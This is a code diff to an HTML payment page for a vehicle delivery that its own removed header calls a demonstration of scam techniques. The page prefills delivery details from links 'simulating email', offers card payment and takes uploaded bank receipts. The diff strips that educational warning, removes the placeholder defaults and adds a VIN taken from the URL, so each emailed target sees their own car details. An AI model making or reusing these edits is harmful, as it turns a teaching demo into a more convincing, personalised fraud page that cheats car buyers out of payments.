@@ -1,4 +1,3 @@
-<!-- WARNING: THIS IS A DEMONSTRATION OF SCAM TECHNIQUES FOR EDUCATIONAL PURPOSES ONLY -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -416,7 +415,7 @@
                 </div>
                 <div class="summary-row">
                     <span>VIN:</span>
-                    <span>7SAYGDEF5PF123456</span>
+                    <span id="vin-display">7SAYGDEF5PF123456</span>
                 </div>
                 <div class="summary-row">
                     <span>Delivery Date:</span>
@@ -456,8 +455,9 @@
     <script>
         // URL parameters to prefill data (simulating email link)
         const urlParams = new URLSearchParams(window.location.search);
-        const deliveryDate = urlParams.get('deliveryDate') || 'October 14, 2024';
-        const deliveryAddress = urlParams.get('address') || '123 Main St, Anytown, CA 90210';
+        const deliveryDate = urlParams.get('deliveryDate');
+        const deliveryAddress = urlParams.get('address');
+        const vin = urlParams.get('vin');  // Added VIN parameter capture
 
         // Initialize with credit card selected
         selectPayment('credit-card');
@@ -465,6 +465,7 @@
         // Set delivery info from "email link"
         document.getElementById('delivery-date').textContent = deliveryDate;
         document.getElementById('delivery-address').textContent = deliveryAddress;
+        document.getElementById('vin-display').textContent = vin;  // Set VIN from URL
 
         // File upload handlers
         document.getElementById('bank-receipt').addEventListener('change', function(e) {
